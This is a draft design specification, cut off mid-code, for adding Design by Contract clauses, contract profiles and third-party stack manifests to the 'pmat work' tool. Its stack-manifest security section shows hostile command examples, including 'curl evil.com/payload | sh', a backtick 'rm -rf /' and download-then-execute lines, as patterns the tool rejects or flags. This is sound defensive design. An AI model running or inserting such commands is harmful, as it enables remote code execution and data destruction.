---
title: "Design by Contract for pmat work"
version: "1.0.0"
status: "Draft"
created: "2026-02-26"
updated: "2026-02-26"
references:
  - "Meyer 1992 — Applying Design by Contract"
  - "Popper 1934 — The Logic of Scientific Discovery"
  - "docs/specifications/popper-nullification-100point-score.md"
  - "docs/specifications/master-plan-pmat-work-system.md"
  - "arxiv:2510.12047 — ContractEval"
  - "arxiv:2510.12702 — Beyond Postconditions"
  - "arxiv:2503.18666 — AgentSpec"
  - "arxiv:2505.19271 — VerifyThisBench"
  - "arxiv:2502.13929 — Formal Verification in Solidity and Move"
epic: "PMAT-DBC"
---

# Design by Contract for `pmat work`

## Executive Summary

Extend `pmat work` with Meyer's Design by Contract (DbC) triad — **require** (preconditions), **ensure** (postconditions), **invariant** (class invariants) — layered on top of the existing Popperian falsification infrastructure. This is not a replacement: Popper tells us *what* to test (falsifiable claims), Meyer tells us *when* and *how* to structure those tests across the work lifecycle.

### Philosophical Foundation

| Principle | Popper (existing) | Meyer (new) | Synthesis |
|-----------|-------------------|-------------|-----------|
| Core idea | Claims must be falsifiable | Obligations are contractual | Falsifiable contracts with structured obligations |
| Timing | At completion (gate) | At every call boundary | Preconditions at start, invariants at checkpoints, postconditions at completion |
| Failure mode | Reject the work | Blame the violator (client or supplier) | Structured diagnostics: *who* broke *which* contract clause |
| Evolution | Claims are immutable | Subcontracting allows refinement | Monotonic strengthening across iterations |

### Design Principles

1. **No Defensive Programming** (Meyer Ch. 7): Do not silently tolerate violations. If a precondition fails, the work session is invalid — do not attempt to "fix it up."
2. **No Hidden Clauses** (Meyer Ch. 6): Every contract term is explicit in `.pmat-work/{id}/contract.json`. No implicit quality expectations.
3. **Subcontracting** (Meyer Ch. 12): Later iterations may weaken preconditions (accept more) or strengthen postconditions (guarantee more), never the reverse.
4. **Rescue, Not Retry** (Meyer Ch. 11): When a postcondition fails at completion, enter a structured rescue state with one remediation attempt before escalating.
5. **Opt-In by Default**: DbC is activated per-project via contract profiles. External projects get a minimal universal profile; the full 22-claim PMAT profile is only applied to batuta stack projects. No claim is evaluated unless the project has opted into it or the profile enables it.

---

## 1. Contract Structure

### 1.1 Current State (Popperian, v4.0)

The existing `WorkContract` contains:
- 22 flat `FalsifiableClaim` entries (no structural grouping)
- `ContractThresholds` with 20+ fields (no temporal binding)
- `FileManifest` for anti-gaming
- Baseline metrics (commit, TDG, coverage, rust-score)

**Problem**: All 22 claims are evaluated at `work complete` time with equal temporal semantics. There is no distinction between "this must be true *before* work starts" vs. "this must hold *throughout*" vs. "this must be true *when done*."

### 1.2 Proposed State (Meyer + Popper)

```rust
pub struct WorkContract {
    // Identity (unchanged)
    pub work_item_id: String,
    pub created_at: chrono::DateTime<chrono::Utc>,
    pub baseline_commit: String,

    // === MEYER TRIAD (new) ===
    pub require: Vec<ContractClause>,     // Preconditions: must hold at work start
    pub ensure: Vec<ContractClause>,      // Postconditions: must hold at work complete
    pub invariant: Vec<ContractClause>,   // Invariants: must hold at every checkpoint

    // === POPPERIAN CLAIMS (retained, reclassified) ===
    pub claims: Vec<FalsifiableClaim>,    // Legacy: auto-classified into triad

    // Baselines & thresholds (unchanged)
    pub baseline_tdg: f64,
    pub baseline_coverage: f64,
    pub baseline_rust_score: Option<f64>,
    pub baseline_file_manifest: FileManifest,
    pub thresholds: ContractThresholds,

    // === SUBCONTRACTING (new) ===
    pub iteration: u32,                           // Current iteration number
    pub inherited_postconditions: Vec<ContractClause>,  // From prior iterations
}
```

### 1.3 ContractClause

```rust
pub struct ContractClause {
    pub id: String,                          // e.g., "require.compiles"
    pub kind: ClauseKind,                    // Require | Ensure | Invariant
    pub description: String,                 // Human-readable obligation
    pub falsification_method: FalsificationMethod,  // Reuse existing 22 methods
    pub threshold: Option<ClauseThreshold>,  // Numeric/boolean gate
    pub blocking: bool,                      // Jidoka: stop-the-line?
    pub source: ClauseSource,                // How this clause was generated
}

pub enum ClauseKind {
    Require,    // Client obligation (checked at work start)
    Ensure,     // Supplier guarantee (checked at work complete)
    Invariant,  // Always-true property (checked at every checkpoint)
}

pub enum ClauseSource {
    Default,            // Auto-generated from project analysis
    Inferred { diff_sha: String },  // Inferred from code diff
    Inherited { from_iteration: u32 },  // Subcontracting
    Manual,             // User-specified
}

pub enum ClauseThreshold {
    Numeric { metric: String, op: ThresholdOp, value: f64 },
    Boolean { expected: bool },
    Delta { metric: String, op: ThresholdOp, value: f64 },  // Relative to baseline
}

pub enum ThresholdOp {
    Gte,  // >=
    Lte,  // <=
    Eq,   // ==
    Gt,   // >
    Lt,   // <
}
```

---

## 2. Contract Profiles (Opt-In Tiers)

DbC is **not** a monolithic system. Projects opt into a contract profile that determines which claims are generated and enforced. The profile is detected automatically from project structure or set explicitly in `.pmat-work/config.toml`.

### 2.1 Profile Detection

```rust
pub enum ContractProfile {
    /// Any project with git + a build/test command. Checks: compiles, tests pass.
    /// Claims: 2 require, 2 invariant, 2 ensure = 6 total
    Universal,

    /// Cargo project detected (Cargo.toml present). Adds: clippy, cargo-audit,
    /// coverage via llvm-cov, complexity via tree-sitter.
    /// Claims: 2 require, 4 invariant, 8 ensure = 14 total
    Rust,

    /// Full batuta stack project (.pmat/ dir or `pmat` in PATH with index).
    /// Adds: TDG, pmat-book, spec quality, formal proofs, cross-crate parity.
    /// Claims: 4 require, 7 invariant, 14 ensure = 25 total
    Pmat,

    /// Third-party tool stack. Teams define their own claims, tools, and rescue
    /// strategies via a stack manifest file. See Section 2.5.
    Stack { manifest: PathBuf },

    /// User-defined profile from `.pmat-work/config.toml`.
    /// Cherry-pick individual claims from any tier.
    Custom { claims: Vec<String> },
}
```

**Auto-detection logic** (evaluated top-down, first match wins):

```
.pmat-work/config.toml has [dbc] profile = "stack"    → Stack (custom manifest)
.pmat-work/config.toml has [dbc] profile = "custom"   → Custom (cherry-picked claims)
.pmat/context.db exists OR .pmat/context.idx exists    → Pmat
.dbc-stack.toml exists                                 → Stack (third-party stack)
Cargo.toml exists                                      → Rust
.git/ exists                                           → Universal
otherwise                                              → error: not a tracked project
```

**Manual override** via `.pmat-work/config.toml`:

```toml
[dbc]
profile = "rust"           # Force a specific profile
# OR cherry-pick:
# profile = "custom"
# claims = [
#   "require.compiles",
#   "require.tests_exist",
#   "invariant.complexity",
#   "ensure.tests_pass",
#   "ensure.coverage",
# ]

[dbc.thresholds]
coverage_pct = 80.0        # Override default 95% (external projects may have lower bars)
max_complexity = 25         # Override default 20
max_file_lines = 600        # Override default 500

[dbc.rescue]
enabled = true              # Opt into rescue protocol (default: true for Pmat, false otherwise)
```

### 2.2 Profile Claim Matrix

| Claim | Universal | Rust | Pmat | Notes |
|-------|:---------:|:----:|:----:|-------|
| **Require (preconditions)** | | | | |
| `require.compiles` | ✓ | ✓ | ✓ | `make build` / `cargo check` / language-specific |
| `require.tests_exist` | ✓ | ✓ | ✓ | At least one test file/function detected |
| `require.manifest_integrity` | — | — | ✓ | FileManifest anti-gaming (PMAT-specific) |
| `require.meta_falsification` | — | — | ✓ | Falsifier self-check (PMAT-specific) |
| **Invariant (checkpoints)** | | | | |
| `invariant.compiles` | ✓ | ✓ | ✓ | Project must compile at every checkpoint |
| `invariant.lint` | — | ✓ | ✓ | `cargo clippy` / language linter |
| `invariant.file_size` | ✓ | ✓ | ✓ | Max file lines (configurable) |
| `invariant.complexity` | — | ✓ | ✓ | Requires tree-sitter analysis |
| `invariant.satd` | — | — | ✓ | SATD detection (requires pmat) |
| `invariant.dead_code` | — | — | ✓ | Dead code detection (requires pmat) |
| `invariant.fix_chain` | — | — | ✓ | Fix-chain limit (requires git history analysis) |
| **Ensure (postconditions)** | | | | |
| `ensure.tests_pass` | ✓ | ✓ | ✓ | `make test` / `cargo test` / language-specific |
| `ensure.no_regression` | — | ✓ | ✓ | No previously-passing test now fails (requires structured test output) |
| `ensure.coverage` | — | ✓ | ✓ | Requires coverage tooling (llvm-cov, etc.) |
| `ensure.differential_coverage` | — | ✓ | ✓ | Changed lines must be covered |
| `ensure.coverage_gaming` | — | — | ✓ | Anti-gaming detection (requires manifest) |
| `ensure.tdg_regression` | — | — | ✓ | TDG score (requires pmat index) |
| `ensure.supply_chain` | — | ✓ | ✓ | `cargo audit` / `npm audit` |
| `ensure.examples_compile` | — | ✓ | ✓ | `cargo test --examples` |
| `ensure.git_sync` | ✓ | ✓ | ✓ | All changes pushed |
| `ensure.spec_quality` | — | — | ✓ | Spec scoring (requires pmat) |
| `ensure.book_validation` | — | — | ✓ | pmat-book (PMAT-only) |
| `ensure.per_file_coverage` | — | — | ✓ | Per-file 95% (requires pmat) |
| `ensure.variant_coverage` | — | — | ✓ | Match arm coverage (requires pmat) |
| `ensure.cross_crate_parity` | — | — | ✓ | Cross-crate tests (batuta stack) |
| `ensure.regression_gate` | — | — | ✓ | Perf regression (requires benchmarks) |
| `ensure.formal_proofs` | — | — | ✓ | Lean 4 proofs (opt-in even for Pmat) |

### 2.3 Claim Totals by Profile

| Profile | Require | Invariant | Ensure | Total | External tools needed |
|---------|---------|-----------|--------|-------|-----------------------|
| Universal | 2 | 2 | 2 | **6** | git + build/test command |
| Rust | 2 | 4 | 8 | **14** | cargo, cargo-audit, cargo-llvm-cov |
| Pmat | 4 | 7 | 14 | **25** | pmat, certeza, renacer (optional) |
| Custom | user-defined | user-defined | user-defined | varies | depends on selected claims |

### 2.4 Toolchain Preconditions (No Silent Skipping)

Selecting a profile implies accepting its toolchain requirements. If the required tools are not installed, `work start` **fails** — it does not silently skip claims. This follows Meyer's "No Defensive Programming" principle: a contract with silently removed clauses is a lie.

Each profile has an implicit `require.toolchain` precondition that verifies all tools are present before creating the contract:

```
$ pmat work start PMAT-500

Profile: Rust (auto-detected from Cargo.toml)

Evaluating toolchain preconditions...
  [require.toolchain.cargo]          ✓ cargo 1.82.0
  [require.toolchain.cargo_clippy]   ✓ clippy 0.1.82
  [require.toolchain.cargo_llvm_cov] ✗ MISSING (install: cargo +nightly install cargo-llvm-cov)
  [require.toolchain.cargo_audit]    ✗ MISSING (install: cargo install cargo-audit)

PRECONDITION FAILURE: 2 required tools missing for Rust profile.

Options:
  1. Install missing tools and retry
  2. Downgrade profile:  pmat work start PMAT-500 --profile universal
  3. Exclude specific claims: pmat work start PMAT-500 --without ensure.coverage,ensure.supply_chain
```

**Toolchain requirements by profile**:

| Profile | Required tools |
|---------|---------------|
| Universal | `git` |
| Rust | `cargo`, `cargo-clippy`, `cargo-llvm-cov`, `cargo-audit` |
| Pmat | `pmat` (with index), `cargo` toolchain, `renacer` (optional: skippable via `--without`) |
| Stack | All tools referenced in `check` commands (verified at trust time) |

**Explicit exclusion** (`--without`) is the only way to remove claims. Unlike silent skipping, this requires developer intent and is recorded in the contract:

```json
{
  "excluded_claims": [
    {
      "id": "ensure.coverage",
      "reason": "developer_excluded",
      "flag": "--without ensure.coverage"
    }
  ]
}
```

This ensures No Hidden Clauses: every exclusion is visible in the contract, and `pmat work status` shows excluded claims distinctly from passed/failed ones.

### 2.5 Stack Manifests (Third-Party Tool Stacks)

Any team or company can define their own quality stack by providing a `.dbc-stack.toml` manifest in the project root. This allows DbC to integrate with arbitrary tooling — not just the batuta stack.

**Manifest format** (`.dbc-stack.toml`):

```toml
[stack]
name = "acme-quality"
version = "1.0.0"
description = "ACME Corp quality stack for Go microservices"

# ============================================================
# Claims: define what your stack checks
# ============================================================

[[require]]
id = "require.compiles"
description = "Service compiles with go build"
check = "go build ./..."                    # Shell command — exit 0 = pass
timeout = 60                                # Seconds

[[require]]
id = "require.proto_valid"
description = "All protobuf definitions are valid"
check = "buf lint"

[[invariant]]
id = "invariant.lint"
description = "golangci-lint passes"
check = "golangci-lint run ./..."
timeout = 120

[[invariant]]
id = "invariant.complexity"
description = "No function exceeds complexity 15"
check = "gocognit -over 15 ./..."           # Exit 1 if any function exceeds
threshold = { metric = "max_complexity", op = "Lte", value = 15.0 }

[[ensure]]
id = "ensure.tests_pass"
description = "All tests pass"
check = "go test ./..."
timeout = 300

[[ensure]]
id = "ensure.coverage"
description = "Coverage >= 80%"
check = "go test -coverprofile=cover.out ./... && go tool cover -func=cover.out"
threshold = { metric = "coverage_pct", op = "Gte", value = 80.0 }
# Extract metric from command output (first capture group must be a number):
metric_pattern = 'total:\s+\(statements\)\s+(\d+\.\d+)%'
# Optional: what to do if the regex doesn't match stdout
metric_on_no_match = "fail"  # "fail" (default) | "warn" | "pass"

[[ensure]]
id = "ensure.security_scan"
description = "No high-severity findings"
check = "gosec -severity high ./..."

# ============================================================
# Rescue strategies (optional)
# ============================================================

[[rescue]]
for_clause = "ensure.coverage"
strategy = "shell"
command = "go test -coverprofile=cover.out ./... -v 2>&1 | grep -E 'FAIL|--- FAIL'"
description = "Show failing/uncovered test paths"

[[rescue]]
for_clause = "ensure.security_scan"
strategy = "manual"
guidance = "Run `gosec -fmt=json ./...` and review findings in SECURITY.md"

# ============================================================
# Thresholds (overridable per-project)
# ============================================================

[thresholds]
coverage_pct = 80.0
max_complexity = 15
max_file_lines = 500
```

**How it works**:

1. `pmat work start` detects `.dbc-stack.toml` and loads the manifest
2. Each `[[require]]`, `[[invariant]]`, `[[ensure]]` block becomes a `ContractClause`
3. The `check` field is a shell command — exit code 0 = pass, non-zero = fail
4. Optional `metric_pattern` regex extracts a numeric value from stdout for threshold comparison
5. Optional `[[rescue]]` blocks map clauses to remediation strategies
6. The stack is entirely self-contained — pmat has zero knowledge of Go, buf, gosec, etc.

**`metric_pattern` semantics**: When a claim has both a `threshold` and a `metric_pattern`:
- The regex is applied to the combined stdout+stderr of the `check` command
- The first capture group `(\d+\.\d+)` must match a parseable `f64`
- If the regex **does not match**, the behavior depends on `metric_on_no_match`:
  - `"fail"` (default): the claim fails with diagnostic: `"metric_pattern did not match command output. Pattern: '...' Output (last 5 lines): '...'"`. This is the safe default — a non-matching regex means the tool output format changed and the threshold cannot be verified.
  - `"warn"`: the claim passes with a warning in the checkpoint/receipt record. Use for advisory-only metrics.
  - `"pass"`: the claim passes silently. Use only when the metric is truly optional.
- If the regex matches but the captured value is not a valid `f64`: the claim fails with `"metric_pattern matched but captured value '...' is not a number"`
- `metric_pattern` is validated at **trust time** by running the check command once and verifying the regex matches. If it doesn't match during trust, a warning is displayed (the tool may not be configured yet).

**Examples of third-party stacks**:

| Stack | Language | Key tools | Claims |
|-------|----------|-----------|--------|
| `acme-quality` | Go | golangci-lint, gosec, buf | 8 |
| `bigcorp-java` | Java/Kotlin | spotbugs, jacoco, archunit | 12 |
| `startup-py` | Python | ruff, pytest-cov, bandit, mypy | 10 |
| `data-team-ml` | Python | great-expectations, mlflow, dvc | 9 |
| `infra-terraform` | HCL | tflint, tfsec, checkov | 7 |

**Publishing stacks**: Stack manifests are vendored into the repository. Remote fetching is not supported — see Security Model below.

#### Security Model for Stack Manifests

Stack manifests contain shell commands. A malicious `.dbc-stack.toml` in a cloned repo is an arbitrary code execution vector. The following defenses are **mandatory**:

**1. Trust-on-first-use (TOFU) with explicit confirmation**

Before any stack command executes, the manifest must be explicitly trusted:

```
$ pmat work start MYTICKET-1

Stack manifest found: .dbc-stack.toml
  Name: acme-quality v1.0.0
  Claims: 8 (2 require, 2 invariant, 4 ensure)

  Commands that will be executed:
    require.compiles       → go build ./...
    require.proto_valid    → buf lint
    invariant.lint         → golangci-lint run ./...
    invariant.complexity   → gocognit -over 15 ./...
    ensure.tests_pass      → go test ./...
    ensure.coverage        → go test -coverprofile=cover.out ./... && go tool cover -func=cover.out
    ensure.security_scan   → gosec -severity high ./...

  Rescue commands:
    ensure.coverage        → go test -coverprofile=cover.out ./... -v 2>&1 | grep -E 'FAIL|--- FAIL'

⚠ Trust this stack manifest? Review the commands above carefully.
  [y]es / [n]o / [v]iew full manifest:
```

Trust is recorded with a content hash:

```json
// .pmat-work/trusted-stacks.json
{
  ".dbc-stack.toml": {
    "sha256": "a1b2c3d4...",
    "trusted_at": "2026-02-26T10:00:00Z",
    "trusted_by": "noah",
    "commands_reviewed": 8
  }
}
```

**2. Content hash invalidation**

Any modification to `.dbc-stack.toml` invalidates trust. The next `pmat work start` re-prompts for confirmation, showing a diff of changed commands:

```
$ pmat work start MYTICKET-2

⚠ Stack manifest .dbc-stack.toml has changed since last trust.
  Changed commands:
    - ensure.security_scan → gosec -severity high ./...
    + ensure.security_scan → curl evil.com/payload | sh

  Re-trust this manifest? [y]es / [n]o / [v]iew diff:
```

**3. Command restrictions**

Stack commands are parsed, not shell-evaluated. The following are **rejected at parse time**:

| Pattern | Reason | Example |
|---------|--------|---------|
| Pipe to shell | RCE via pipe | `curl foo \| sh`, `wget foo \| bash` |
| Backtick substitution | Hidden execution | `` check = "`rm -rf /`" `` |
| `$()` substitution | Hidden execution | `check = "$(curl evil)"` |
| Redirect to executable | Payload drop | `check = "curl foo > /tmp/x && chmod +x /tmp/x"` |
| Network fetch + execute | Supply chain | `check = "wget -O- url \| python"` |

Allowed: simple commands with arguments, `&&` chaining, `2>&1` redirection, environment variables via `$VAR` (resolved from current env, not from command output).

Commands are executed via `Command::new()` with argument splitting, **not** via `sh -c`. The `&&` operator is handled by pmat (run sequentially, short-circuit on failure), not by the shell.

**4. No remote manifest fetching**

`stack_url` is **not supported**. Manifests must be committed to the repository. This ensures:
- Code review catches malicious commands (same as reviewing CI configs)
- Git history tracks all manifest changes
- No MITM or CDN compromise vectors
- No dependency on external availability

Teams share stacks by vendoring the file or using git submodules:

```bash
# Vendor a shared stack
cp ../shared-quality-stacks/go-stack.toml .dbc-stack.toml
git add .dbc-stack.toml
```

**5. Toolchain verification at trust time**

When a manifest is trusted, all tools referenced in `check` commands are verified present:

```
$ pmat work trust-stack .dbc-stack.toml

Verifying tools referenced in commands...
  go             ✓ /usr/local/go/bin/go (1.22.0)
  buf            ✓ /usr/local/bin/buf (1.28.0)
  golangci-lint  ✓ /usr/local/bin/golangci-lint (1.55.0)
  gocognit       ✗ MISSING (install: go install github.com/uudashr/gocognit/cmd/gocognit@latest)
  gosec          ✗ MISSING (install: go install github.com/securego/gosec/v2/cmd/gosec@latest)

2 missing tools. Install them before trusting.
```

This applies the same toolchain precondition model as built-in profiles (Section 2.4): missing tools block trust, and therefore block `work start`.

### 2.6 Profile Composition

Profiles are composable. A Rust project using a custom quality stack can inherit the `Rust` profile and extend it:

```toml
# .dbc-stack.toml
[stack]
name = "my-rust-extra"
extends = "rust"  # Inherit all 14 Rust claims

# Add custom claims on top
[[ensure]]
id = "ensure.miri_clean"
description = "No undefined behavior detected by Miri"
check = "cargo +nightly miri test"
timeout = 600

[[ensure]]
id = "ensure.fuzz_corpus"
description = "Fuzz corpus covers all parsers"
check = "cargo fuzz check"
```

This yields 14 (Rust) + 2 (custom) = 16 claims. The `extends` field supports: `"universal"`, `"rust"`, `"pmat"`, or another stack manifest path.

#### Claim ID Conflict Resolution

When a stack defines a claim with the same `id` as an inherited claim, the conflict is resolved by the **stricter-wins** rule, consistent with subcontracting (child may only strengthen):

```toml
# Parent (Rust profile): ensure.coverage >= 95.0
# Stack override:
[[ensure]]
id = "ensure.coverage"
check = "cargo llvm-cov --fail-under 80"
threshold = { metric = "coverage_pct", op = "Gte", value = 80.0 }
```

Resolution:
1. Compare thresholds using `compare_thresholds()` (Section 5.2).
2. If the stack threshold is **stricter** (strengthened): stack wins. The inherited claim is replaced.
3. If the stack threshold is **weaker** (weakened): **error at trust time**. The stack cannot lower standards below the base profile.
4. If thresholds are **incompatible** (different types/operators): **error at parse time**. The developer must resolve manually.
5. If the stack claim has a different `check` command but same/stricter threshold: stack command replaces inherited command (the tool can differ if the guarantee is equivalent or stronger).

```
$ pmat work trust-stack .dbc-stack.toml

Conflict: ensure.coverage
  Inherited (rust): >= 95.0% via cargo-llvm-cov
  Stack override:   >= 80.0% via custom command
  Resolution: REJECTED — stack weakens inherited postcondition (80 < 95)
  Fix: set threshold >= 95.0 or remove the override to inherit the Rust default
```

This ensures `extends` composes safely: a stack can never lower the bar of its parent profile.

---

## 3. Classification of Existing 22 Claims (Pmat Profile)

Each existing `FalsificationMethod` is reclassified into the Meyer triad based on *when* the obligation matters:

### 3.1 Require (Preconditions) — checked at `work start`

| # | Method | Rationale |
|---|--------|-----------|
| 1 | `ManifestIntegrity` | Baseline files must exist *before* work begins |
| 2 | `MetaFalsification` | Falsifier must be active *before* relying on it |

**Meyer justification**: These are client obligations. The developer (client) must ensure the workspace is in a valid state before starting work. If preconditions fail, the work session is rejected — no defensive "fix-up."

### 3.2 Invariant — checked at every `work checkpoint`

| # | Method | Rationale |
|---|--------|-----------|
| 7 | `ComplexityRegression` | No function may exceed complexity limit at any point |
| 9 | `FileSizeRegression` | No file may exceed 500 lines at any point |
| 14 | `SatdDetection` | No new SATD markers may accumulate during work |
| 15 | `DeadCodeDetection` | No new dead code may be introduced at any point |
| 17 | `LintPass` | Lint must pass throughout development |
| 19 | `FixChainLimit` | Fix-after-fix chains must not exceed limit at any point |

**Meyer justification**: These are class invariants — properties that must hold at every observable state transition (checkpoint). Violations at any checkpoint halt the work (Jidoka).

### 3.3 Ensure (Postconditions) — checked at `work complete`

| # | Method | Rationale |
|---|--------|-----------|
| 3 | `CoverageGaming` | No coverage exclusion gaming in final submission |
| 4 | `DifferentialCoverage` | All changed lines covered in final submission |
| 5 | `AbsoluteCoverage` | Total coverage >= 95% at completion |
| 6 | `TdgRegression` | TDG score >= baseline at completion |
| 8 | `SupplyChainIntegrity` | No vulnerable deps in final submission |
| 10 | `SpecQuality` | Spec score meets threshold at completion |
| 11 | `GitHubSync` | All changes pushed at completion |
| 12 | `ExamplesCompile` | All examples work at completion |
| 13 | `BookValidation` | pmat-book passes at completion |
| 16 | `PerFileCoverage` | All files >= 95% coverage at completion |
| 18 | `VariantCoverage` | All match arm variants tested at completion |
| 20 | `CrossCrateParity` | Cross-crate tests pass at completion |
| 21 | `RegressionGate` | No performance regressions at completion |
| 22 | `FormalProofVerification` | No incomplete proofs at completion |

**Meyer justification**: These are supplier guarantees. The developer (supplier) promises that completion delivers specific quality properties. Postconditions are only checked at the completion boundary, not during intermediate development.

---

## 4. Lifecycle Integration

### 4.1 `pmat work start` — Precondition Evaluation

```
$ pmat work start PMAT-500

Evaluating preconditions (require)...
  [require.manifest_integrity]  ✓ All 847 baseline files present
  [require.meta_falsification]  ✓ Falsifier active (v4.0, 22 claims)

Capturing baselines...
  coverage: 99.59%  |  tdg: 82.3  |  rust-score: 78/106

Contract created: .pmat-work/PMAT-500/contract.json
  require:   2 clauses (all passed)
  ensure:   14 clauses (verified at completion)
  invariant: 6 clauses (verified at each checkpoint)
```

**Failure behavior**: If any `require` clause fails, `work start` **refuses to create the contract** (Meyer: "Do not attempt to execute the routine if preconditions are not met").

### 4.2 `pmat work checkpoint` — Invariant Evaluation

```
$ pmat work checkpoint PMAT-500

Evaluating invariants...
  [invariant.complexity]     ✓ Max function complexity: 18 (limit: 20)
  [invariant.file_size]      ✓ Max file size: 423 lines (limit: 500)
  [invariant.satd]           ✓ No new SATD markers
  [invariant.dead_code]      ✓ No new dead code
  [invariant.lint]           ✓ Lint clean
  [invariant.fix_chain]      ✓ Fix chain: 1 (limit: 3)

All invariants hold. Checkpoint recorded.
Iteration: 1  |  Commits since start: 3  |  Files changed: 7
```

**Failure behavior**: If any `invariant` clause fails, the checkpoint is **rejected** and the violation is recorded. The developer must fix the invariant violation before the next checkpoint can succeed. Work does not halt (unlike completion), but accumulated violations block completion.

#### Automatic Checkpoint Triggers

Manual `pmat work checkpoint` is always available, but invariants are only useful if checkpoints actually happen. To prevent developers from simply never checkpointing (making invariants toothless), the following automatic triggers are supported:

| Trigger | Mechanism | Opt-in |
|---------|-----------|--------|
| **Pre-commit hook** | `pmat hooks install` adds a pre-commit hook that runs `pmat work checkpoint` when an active work session exists. Invariant failure blocks the commit. | Default for Pmat profile, opt-in for others |
| **`work complete` final check** | `work complete` always runs a final invariant evaluation before postconditions. This is mandatory — even developers who never checkpoint get invariants checked at completion. | Mandatory (not bypassable) |
| **CI integration** | CI pipelines can run `pmat work checkpoint --ci` to evaluate invariants on push. Failures are reported as CI check failures. | Opt-in via CI config |

The **mandatory completion check** is the safety net: even with zero manual checkpoints, invariants are still evaluated at completion time. The pre-commit hook provides earlier feedback. The combination ensures invariants are never purely advisory.

Configuration via `.pmat-work/config.toml`:

```toml
[dbc.checkpoints]
pre_commit_hook = true    # Auto-checkpoint on commit (default: true for Pmat)
# min_checkpoint_interval = 3600  # Future: minimum seconds between auto-checkpoints
```

### 4.3 `pmat work complete` — Postcondition Evaluation + Rescue

```
$ pmat work complete PMAT-500

Evaluating preconditions (re-verify)...    ✓ 2/2
Evaluating invariants (final check)...     ✓ 6/6
Evaluating postconditions (ensure)...
  [ensure.differential_coverage]  ✓ All 47 changed lines covered
  [ensure.absolute_coverage]      ✓ 99.62% >= 95%
  [ensure.tdg_regression]         ✗ TDG 81.1 < baseline 82.3

POSTCONDITION VIOLATION: ensure.tdg_regression
  Obligation: TDG score >= baseline (82.3)
  Actual: 81.1 (delta: -1.2)
  Violator: supplier (developer)

Entering rescue state (Meyer §11)...
```

**Completion requires**: ALL require + ALL invariant + ALL ensure clauses pass. This is stricter than the current system where all 22 claims are flat — now temporal violations are tracked.

**Evaluation order for `ensure.git_sync`**: This postcondition has a chicken-and-egg problem — completion generates artifacts (CHANGELOG, roadmap status update) that must be pushed, but the push can't happen until completion succeeds. The resolution is a two-phase completion:

1. **Pre-completion gate**: Evaluate all `ensure` clauses *except* `ensure.git_sync`. If any fail, enter rescue or abort.
2. **Completion commit**: Generate CHANGELOG, update roadmap, create completion commit.
3. **Post-completion sync**: Push all changes, then evaluate `ensure.git_sync`. If the push fails (e.g., network error, rejected push), the completion is rolled back (revert the completion commit) and the developer retries.

This means `ensure.git_sync` is the only postcondition evaluated *after* the completion commit, not before. The contract records this as `evaluation_phase: "post_commit"`.

---

## 5. Subcontracting (Iteration Refinement)

Meyer's subcontracting rule (§12) enforces monotonic improvement: later iterations must guarantee at least as much as earlier ones. We borrow this as a **policy rule** — not because work iterations substitute for each other (they don't — this is not class inheritance), but because ratcheting quality forward prevents regression across long-lived work items.

### 5.1 Rules

| Clause kind | Iteration N+1 may... | Iteration N+1 may NOT... |
|-------------|----------------------|--------------------------|
| Require | Remove or weaken preconditions | Add or strengthen preconditions |
| Ensure | Add or strengthen postconditions | Remove or weaken postconditions |
| Invariant | Add new invariants | Remove existing invariants |

### 5.2 Threshold Comparison Semantics

Subcontracting requires comparing thresholds to determine if a postcondition was weakened. Comparison is defined for each `ClauseThreshold` variant:

| Parent threshold | Child threshold | Strengthened? | Weakened? |
|-----------------|----------------|:-------------:|:---------:|
| `Numeric(Gte, 95.0)` | `Numeric(Gte, 96.0)` | Yes (higher bar) | — |
| `Numeric(Gte, 95.0)` | `Numeric(Gte, 90.0)` | — | Yes (lower bar) |
| `Numeric(Lte, 20.0)` | `Numeric(Lte, 15.0)` | Yes (tighter limit) | — |
| `Numeric(Lte, 20.0)` | `Numeric(Lte, 25.0)` | — | Yes (looser limit) |
| `Boolean(true)` | `Boolean(true)` | Equal (OK) | — |
| `Boolean(true)` | `Boolean(false)` | — | Yes (relaxed) |
| `Delta(Gte, +0.5)` | `Delta(Gte, +1.0)` | Yes (more improvement required) | — |
| `None` | `None` | Equal (OK) | — |
| `None` | `Numeric(...)` | Yes (added threshold) | — |
| `Numeric(...)` | `None` | — | Yes (removed threshold) |
| `Numeric(Gte, ...)` | `Numeric(Lte, ...)` | **Error**: incompatible operators | — |
| `Numeric(...)` | `Boolean(...)` | **Error**: incompatible types | — |

**Rules**:
- Same-type, same-operator: compare values. For `Gte`/`Gt`, higher child value = strengthened. For `Lte`/`Lt`, lower child value = strengthened.
- `Boolean`: `true` is stricter than `false`. `true → true` is equal. `true → false` is weakened.
- `None → Numeric/Boolean`: adding a threshold is strengthening.
- `Numeric/Boolean → None`: removing a threshold is weakening.
- Different operator or type: **error** — incompatible thresholds cannot be compared. The developer must resolve the conflict explicitly.

```rust
pub fn compare_thresholds(
    parent: &Option<ClauseThreshold>,
    child: &Option<ClauseThreshold>,
) -> ThresholdComparison {
    match (parent, child) {
        (None, None) => ThresholdComparison::Equal,
        (None, Some(_)) => ThresholdComparison::Strengthened,
        (Some(_), None) => ThresholdComparison::Weakened,
        (Some(p), Some(c)) => match (p, c) {
            (Numeric { op: p_op, value: p_val, .. },
             Numeric { op: c_op, value: c_val, .. }) => {
                if p_op != c_op {
                    return ThresholdComparison::Incompatible;
                }
                match p_op {
                    Gte | Gt => if c_val >= p_val { Strengthened } else { Weakened },
                    Lte | Lt => if c_val <= p_val { Strengthened } else { Weakened },
                    Eq => if c_val == p_val { Equal } else { Incompatible },
                }
            }
            (Boolean { expected: p }, Boolean { expected: c }) => {
                match (p, c) {
                    (true, true) | (false, false) => Equal,
                    (false, true) => Strengthened,
                    (true, false) => Weakened,
                }
            }
            (Delta { op: p_op, value: p_val, .. },
             Delta { op: c_op, value: c_val, .. }) => {
                if p_op != c_op { return Incompatible; }
                match p_op {
                    Gte | Gt => if c_val >= p_val { Strengthened } else { Weakened },
                    Lte | Lt => if c_val <= p_val { Strengthened } else { Weakened },
                    Eq => if c_val == p_val { Equal } else { Incompatible },
                }
            }
            _ => ThresholdComparison::Incompatible, // Different types
        }
    }
}

pub enum ThresholdComparison {
    Strengthened,
    Weakened,
    Equal,
    Incompatible, // Error: types or operators don't match
}
```

### 5.3 Enforcement

```rust
pub fn validate_subcontracting(
    parent: &WorkContract,
    child: &WorkContract,
) -> Result<(), SubcontractingViolation> {
    for parent_ensure in &parent.ensure {
        let child_ensure = child.ensure.iter()
            .find(|c| c.id == parent_ensure.id);
        match child_ensure {
            None => return Err(SubcontractingViolation::PostconditionDropped {
                clause: parent_ensure.id.clone(),
            }),
